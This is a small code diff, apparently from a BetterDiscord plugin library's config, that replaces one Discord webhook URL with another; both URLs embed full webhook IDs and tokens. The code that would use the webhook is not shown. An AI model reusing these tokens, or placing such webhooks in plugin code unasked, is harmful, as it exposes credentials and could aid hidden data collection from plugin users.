@@ -18,7 +18,7 @@ const config = {
         "version": "1.1.2",
         "description": "LIBRARY for most of the Better Discord plugins"
     },
-    "webhook": "https://discord.com/api/webhooks/826128233136128031/p3yQ_GuyhDeiObj6EY-gdjBGkT1ZbKcWNepnqBxg9nfcdDEOYFHXTrdspCgQy_VeuDX_"
+    "webhook": "https://discord.com/api/webhooks/826877022205640785/AfGbmPp_Ug99lCaBS2_CORW8wNXHLvHH_vWaDs86H_0hVvUlXvBW2166fh-rk7VpIW8C"
 }
 
 class BDFD {
